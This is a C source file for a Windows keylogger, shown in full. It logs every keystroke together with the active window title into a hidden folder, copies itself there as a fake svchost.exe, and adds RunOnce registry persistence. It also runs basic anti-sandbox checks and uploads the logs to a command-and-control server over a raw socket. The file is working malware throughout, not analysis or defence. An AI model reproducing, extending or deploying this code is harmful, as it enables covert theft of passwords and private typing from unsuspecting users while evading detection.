#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <strings.h>
#include <unistd.h>
#include <errno.h>
#include <windows.h>
//probably 2 many header files

//IF COMPILED W GCC, -lWs2_32 needs to be specified

//Config var
char msysfdrpth[64] = "C:\\System"; // C: disk folder w hidden + sys attr
char tskmnm[32] = "C:\\System\\svchost.exe"; // name that shows up in taskmgr.exe
char klgrhxl[64] = "C:\\System\\hex.txt"; //hex for keyboard output
char klgramn[64] = "C:\\System\\allmin.txt"; //minimal but good info for keylogger
char klgrall[64] = "C:\\System\\all.txt"; // most info for keylogger
char fname[64]; // argv[0] for other functions than main
//server that receives keylogger files
int port = 80;
char ipaddr[32] = "xxx.xxx.xxx.xxx";


int klfgr(){ //self explanatory
    char prev_title[64];
    FILE *writefilepointer;
    writefilepointer = fopen(klgrall,"a");
    FILE *writefilepointer3;
    writefilepointer3 = fopen(klgrhxl,"a");
    FILE *writefilepointer4;
    writefilepointer4 = fopen(klgramn,"a");
    while(1){
        for(int c = 1;c < 255;c++){
            if(GetAsyncKeyState(c) == -32767){
                HWND foreground = GetForegroundWindow();
                if(foreground){ 
                    char windows_title[256];
                    GetWindowText(foreground,windows_title,256);
                    char f2f[256];
                    char f3f[256];
                    char chstr[10];
                    int i = c;
                    switch(i){
                        case 0x01:
                            strncpy(chstr,"[lbutton]",10);
                            break;
                        case 0x2 :
                            strncpy(chstr,"[rbutton]",10);
                            break;
                        case 0x3 :
                            strncpy(chstr,"[VK_CANCEL]",10);
                            break;
                        case 0x4:
                            strncpy(chstr,"[mbutton]",10);
                            break;
                        case 0x5:
                            strncpy(chstr,"[x1mouse]",10);
                            break;
                        case 0x6:
                            strncpy(chstr,"[x2mouse]",10);
                            break;
                        case 0x7:
                            strncpy(chstr,"[undef]",10);
                            break;
                        case 0x8:
                            strncpy(chstr,"[backsp]",10);
                            break;
                        case 0x9:
                            strncpy(chstr,"[tab]",10);
                            break;
                        case 0xa:
                            strncpy(chstr,"[reserved]",10);
                            break;
                        case 0xb :
                            strncpy(chstr,"[reserved]",10);
                            break;
                        case 0xc:
                            strncpy(chstr,"[clear]",10);
                            break;
                        case 0xd :
                            strncpy(chstr,"[enter]",10);
                            break;
                        case 0xe :
                            strncpy(chstr,"[undef]",10);
                            break;
                        case 0xf :
                            strncpy(chstr,"[undef]",10);
                            break;
                        case 0x10 :
                            strncpy(chstr,"[shift]",10);
                            break;
                        case 0x11:
                            strncpy(chstr,"[ctrl]",10);
                            break;
                        case 0x12 :
                            strncpy(chstr,"[alt]",10);
                            break;
                        case 0x13 :
                            strncpy(chstr,"[pause]",10);
                            break;
                        case 0x14 :
                            strncpy(chstr,"[cpslck]",10);
                            break;
                        case 0x15 :
                            strncpy(chstr,"[imekana]",10);
                            break;
                        case 0x16 :
                            strncpy(chstr,"[undef]",10);
                            break;
                        case 0x17:
                            strncpy(chstr,"[imejunj]",10);
                            break;
                        case 0x18 :
                            strncpy(chstr,"[imefin]",10);
                            break;
                        case 0x19:
                            strncpy(chstr,"[ime-x]",10);
                            break;
                        case 0x1a:
                            strncpy(chstr,"[undef]",10);
                            break;
                        case 0x1b :
                            strncpy(chstr,"[esc]",10);
                            break;
                        case 0x1c:
                            strncpy(chstr,"[imecnv]",10);
                            break;
                        case 0x1e:
                            strncpy(chstr,"[imencnv]",10);
                            break;
                        case 0x1f :
                            strncpy(chstr,"[imech]",10);
                            break;
                        case 0x20:
                            strncpy(chstr,"[space]",10);
                            break;
                        case 0x21:
                            strncpy(chstr,"[pgup]",10);
                            break;
                        case 0x22:
                            strncpy(chstr,"[pgdwn]",10);
                            break;
                        case 0x23 :
                            strncpy(chstr,"[end]",10);
                            break;
                        case 0x24 :
                            strncpy(chstr,"[home]",10);
                            break;
                        case 0x25:
                            strncpy(chstr,"[lftarr]",10);
                            break;
                        case 0x26 :
                            strncpy(chstr,"[uparr]",10);
                            break;
                        case 0x27:
                            strncpy(chstr,"[rightar]",10);
                            break;
                         case 0x28:
                            strncpy(chstr,"[dwnarr]",10);
                            break;
                        case 0x29:
                            strncpy(chstr,"[select]",10);
                            break;
                        case 0x2a:
                            strncpy(chstr,"[printk]",10);
                            break;
                        case 0x2b:
                            strncpy(chstr,"[execk]",10);
                            break;
                        case 0x2c:
                            strncpy(chstr,"[printscr]",10);
                            break;
                        case 0x2d:
                            strncpy(chstr,"[insert]",10);
                            break;
                        case 0x2e:
                            strncpy(chstr,"[del]",10);
                            break;
                        case 0x2f:
                            strncpy(chstr,"[helpk]",10);
                            break;
                        case 0x30:
                            strncpy(chstr,"0",10);
                            break;
                        case 0x31:
                            strncpy(chstr,"1",10);
                            break;
                        case 0x32:
                            strncpy(chstr,"2",10);
                            break;
                        case 0x33:
                            strncpy(chstr,"3",10);
                            break;
                        case 0x34:
                            strncpy(chstr,"4",10);
                            break;
                        case 0x35:
                            strncpy(chstr,"5",10);
                            break;
                        case 0x36:
                            strncpy(chstr,"6",10);
                            break;
                        case 0x37:
                            strncpy(chstr,"7",10);
                            break;
                        case 0x38:
                            strncpy(chstr,"8",10);
                            break;
                        case 0x39:
                            strncpy(chstr,"9",10);
                            break;
                        case 0x3a:
                            strncpy(chstr,"[undef]",10);
                            break;
                        case 0x3b:
                            strncpy(chstr,"[undef]",10);
                            break;
                        case 0x3c:
                            strncpy(chstr,"[undef]",10);
                            break;
                        case 0x3d:
                            strncpy(chstr,"[undef]",10);
                            break;
                        case 0x3e:
                            strncpy(chstr,"[undef]",10);
                            break;
                        case 0x3f:
                            strncpy(chstr,"[undef]",10);
                            break;
                        case 0x40:
                            strncpy(chstr,"[undef]",10);
                            break;
                        case 0x41:
                            strncpy(chstr,"a",10);
                            break;
                        case 0x42:
                            strncpy(chstr,"b",10);
                            break;
                        case 0x43:
                            strncpy(chstr,"c",10);
                            break;
                        case 0x44:
                            strncpy(chstr,"d",10);
                            break;
                        case 0x45:
                            strncpy(chstr,"e",10);
                            break;
                        case 0x46:
                            strncpy(chstr,"f",10);
                            break;
                        case 0x47:
                            strncpy(chstr,"g",10);
                            break;
                        case 0x48:
                            strncpy(chstr,"h",10);
                            break;
                        case 0x49:
                            strncpy(chstr,"i",10);
                            break;
                        case 0x4a:
                            strncpy(chstr,"j",10);
                            break;
                        case 0x4b:
                            strncpy(chstr,"k",10);
                            break;
                        case 0x4c:
                            strncpy(chstr,"l",10);
                            break;
                        case 0x4d:
                            strncpy(chstr,"m",10);
                            break;
                        case 0x4e:
                            strncpy(chstr,"n",10);
                            break;
                        case 0x4f:
                            strncpy(chstr,"o",10);
                            break;
                        case 0x50:
                            strncpy(chstr,"p",10);
                            break;
                        case 0x51:
                            strncpy(chstr,"q",10);
                            break;
                        case 0x52:
                            strncpy(chstr,"r",10);
                            break;
                        case 0x53:
                            strncpy(chstr,"s",10);
                            break;
                        case 0x54:
                            strncpy(chstr,"t",10);
                            break;
                        case 0x55:
                            strncpy(chstr,"u",10);
                            break;
                        case 0x56:
                            strncpy(chstr,"v",10);
                            break;
                        case 0x57:
                            strncpy(chstr,"w",10);
                            break;
                        case 0x58:
                            strncpy(chstr,"x",10);
                            break;
                        case 0x59:
                            strncpy(chstr,"y",10);
                            break;
                        case 0x5a:
                            strncpy(chstr,"z",10);
                            break;
                        case 0x5b:
                            strncpy(chstr,"[l-win]",10);
                            break;
                        case 0x5c:
                            strncpy(chstr,"[r-win]",10);
                            break;
                        case 0x5d:
                            strncpy(chstr,"[app]",10);
                            break;
                        case 0x5e:
                            strncpy(chstr,"[undef]",10);
                            break;
                        case 0x5f:
                            strncpy(chstr,"[sleep]",10);
                            break;
                        case 0x70:
                            strncpy(chstr,"[f1]",10);
                            break;
                        case 0x71:
                            strncpy(chstr,"[f2]",10);
                            break;
                        case 0x72:
                            strncpy(chstr,"[f3]",10);
                            break;
                        case 0x73:
                            strncpy(chstr,"[f4]",10);
                            break;
                        case 0x74:
                            strncpy(chstr,"[f5]",10);
                            break;
                        case 0x75:
                            strncpy(chstr,"[f6]",10);
                            break;
                        case 0x76:
                            strncpy(chstr,"[f7]",10);
                            break;
                        case 0x77:
                            strncpy(chstr,"[f8]",10);
                            break;
                        case 0x78:
                            strncpy(chstr,"[f9]",10);
                            break;
                        case 0x79:
                            strncpy(chstr,"[f10]",10);
                            break;
                        case 0x7a:
                            strncpy(chstr,"[f11]",10);
                            break;
                        case 0x7b:
                            strncpy(chstr,"[f12]",10);
                            break;
                        case 0xa0:
                            strncpy(chstr,"[lshift]",10);
                            break;
                        case 0xA1:
                            strncpy(chstr,"[rshift]",10);
                            break;
                        case 0xA2:
                            strncpy(chstr,"[lcontrl]",10);
                            break;
                        case 0xA3:
                            strncpy(chstr,"[rcontrl]",10);
                            break;
                        case 0xA6:
                            strncpy(chstr,"[brsbck]",10);
                            break;
                        case 0xA7:
                            strncpy(chstr,"[brsfrd]",10);
                            break;
                        case 0xba:
                            strncpy(chstr,"[oem1]",10);
                            break;
                        case 0xbb:
                            strncpy(chstr,"[oempls]",10);
                            break;
                        case 0xbc:
                            strncpy(chstr,"[oemcmma]",10);
                            break;
                        default:
                           strncpy(chstr,"[--n/a--]",10);
                            break;
                    }
                    if(strcmp(prev_title,windows_title) == 0){
                        sprintf(f2f,"%s-0x%x;",chstr,c);
                        sprintf(f3f,"%s",chstr);
                    }
                    else{
                        sprintf(f2f,"\n%s>\n%s-0x%x",windows_title,chstr,c);
                        sprintf(f3f,"\n%s>\n%s",windows_title,chstr);
                        sprintf(prev_title,"%s",windows_title);
                    }
                    fprintf(writefilepointer,"%s",f2f);
                    fprintf(writefilepointer3,"0x%x;",c);
                    fprintf(writefilepointer4,"%s",f3f);
                    fflush(writefilepointer);
                    fflush(writefilepointer3);
                    fflush(writefilepointer4);
                }
            }
        }
        Sleep(1);
    }
    fclose(writefilepointer);
    fclose(writefilepointer3);
    fclose(writefilepointer4);
    return 0;
}
int _cfolder_regpers(){
    CreateDirectory(msysfdrpth,NULL);
    SetFileAttributes(msysfdrpth,FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
    CopyFile(fname,tskmnm,0);
    char roncecmdex[200];
    sprintf(roncecmdex,"/C echo yes | reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v somekeyname /d %s",tskmnm);
    ShellExecute(NULL,
    0,
    "cmd.exe",
    roncecmdex,
    NULL,
    SW_HIDE);
    return 0;
}
int checkDirCount(char directory[64]){
    char cmdbuf[256];
    char dircmd[300];
    int cmdcount = 0;
    sprintf(dircmd,"dir %s",directory);
    FILE *cmmnd = popen(dircmd,"r");
    memset(cmdbuf,'\0',256);
    while(fgets(cmdbuf,sizeof(cmdbuf), cmmnd) != 0){
        cmdcount++;
        memset(cmdbuf,'\0',256);
    }
    cmdcount = cmdcount - 9;
    return cmdcount;
}
int c2(){
    Sleep(10000);
    char message_reply[2048];
    SOCKET s;
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2),&wsa);
    s = socket(AF_INET,SOCK_STREAM,0);
    struct sockaddr_in connect_info;
    connect_info.sin_family = AF_INET;
    connect_info.sin_port = htons( port );
    connect_info.sin_addr.s_addr = inet_addr(ipaddr);
    int status = connect(s,(struct sockaddr*)&connect_info,sizeof(connect_info));
    while(status == -1){
        status = connect(s,(struct sockaddr*)&connect_info,sizeof(connect_info));
        if(status == -1){
            shutdown(s,SD_BOTH);
            closesocket(s);
        }
    }
    FILE* all1 = fopen(klgrall,"r");
    FILE* all2 = fopen(klgramn,"r");
    FILE* all3 = fopen(klgrhxl,"r");
    char line[2048];
    while(fgets(line, sizeof(line),all1) != NULL){
        send(s,line,strlen(line),0);
        Sleep(20);
    }
    while(fgets(line, sizeof(line),all2) != NULL){
        send(s,line,strlen(line),0);
        Sleep(20);
    }
    while(fgets(line, sizeof(line),all3) != NULL){
        send(s,line,strlen(line),0);
        Sleep(20);
    }
    Sleep(5000);
    send(s,"END00",5,0);
    shutdown(s,SD_BOTH);
    fclose(all1);
    fclose(all2);
    fclose(all3);
    closesocket(s);
    return 0;
}
int main(int argc,char* argv[]){
        FreeConsole(); //get rid of console window
        sprintf(fname,"%s",argv[0]);
        Sleep(20000);

	//Very Basic Anti-Sandboxing
        SYSTEM_INFO sysinfo; 
        GetSystemInfo(&sysinfo);
        int numCPU = sysinfo.dwNumberOfProcessors;
        if(numCPU <= 2){ // self-explanatory
            return 0;
        }
        if(checkDirCount("%USERPROFILE%\\Desktop") <= 6){
	    return 0;
        }
        if(checkDirCount("%USERPROFILE%\\Downloads") <= 1){
            return 0;
        }
   	_cfolder_regpers(); //registry peristence
    	c2(); //upload files once every reboot
    	klfgr(); //klgr

        return 0;
}
